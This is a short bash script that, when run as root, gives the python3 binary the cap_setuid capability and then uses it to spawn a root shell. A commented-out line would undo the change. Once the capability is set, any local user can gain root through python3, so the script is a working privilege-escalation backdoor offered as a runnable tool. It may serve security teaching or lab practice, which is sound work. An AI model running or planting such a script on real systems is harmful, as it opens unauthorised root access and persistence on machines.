#!/bin/bash

# execute with root user

pathFile=`readlink -f $(which python3)`

if [ -f "$pathFile" ]; then
   setcap cap_setuid+ep $pathFile
   echo "Status capability: $(getcap $pathFile)"
   $pathFile -c 'import os; os.setuid(0); os.system("/bin/bash")'
else
   echo "Python3 no existe"
fi

# delete cap
# setcap -r $pathFile